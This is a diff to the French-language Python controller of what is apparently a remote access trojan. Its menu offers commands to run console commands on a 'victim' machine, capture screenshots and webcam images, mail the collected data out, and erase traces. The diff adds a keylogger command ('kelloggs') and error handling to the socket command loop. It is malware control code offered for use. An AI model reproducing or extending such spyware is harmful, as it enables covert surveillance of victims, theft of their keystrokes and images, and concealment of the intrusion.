@@ -53,19 +53,26 @@ print("")
 print("Liste des commandes: \n- cmd (permet l'utilisation des commandes consoles. Exemple: cmd cls) \
 	\n- clean (pour effacer toutes traces... Exemple: screenshots, camshots, keylogs...)\
 	\n- mail mailpw smtpadr smtpport (paramètres conernants la reception de données par mail de la victime)\
+	\n- kelloggs (enregistre toutes les frappes au clavier de la victime. Le serveur devient oqp)\
 	\n- scr camshot (prendre un screenshot ou une image de la webcam de la victime) \
 	\n- rcv (recevoir toutes les données collectées par mail) \
 	\n- quit")
 msg_a_envoyer = b""
 
 while msg_a_envoyer != b"quit":
-    msg_a_envoyer = input("> ")
-    # Peut planter si vous tapez des caractères spéciaux
-    msg_a_envoyer = msg_a_envoyer.encode()
-    # On envoie le message
-    connexion_avec_serveur.send(msg_a_envoyer)
-    msg_recu = connexion_avec_serveur.recv(1024)
-    print(msg_recu.decode()) # Là encore, peut planter s'il y a des accents
+	msg_a_envoyer = input("> ")
+	# Peut planter si vous tapez des caractères spéciaux
+	msg_a_envoyer = msg_a_envoyer.encode()
+	# On envoie le message
+	try:
+		connexion_avec_serveur.send(msg_a_envoyer)
+		msg_recu = connexion_avec_serveur.recv(1024)
+		print(msg_recu.decode()) # Là encore, peut planter s'il y a des accents
+	except:
+		print("connexion perdue !")
 
 print("Fermeture de la connexion")
-connexion_avec_serveur.close()
+try:
+	connexion_avec_serveur.close()
+except:
+	os.system("exit")
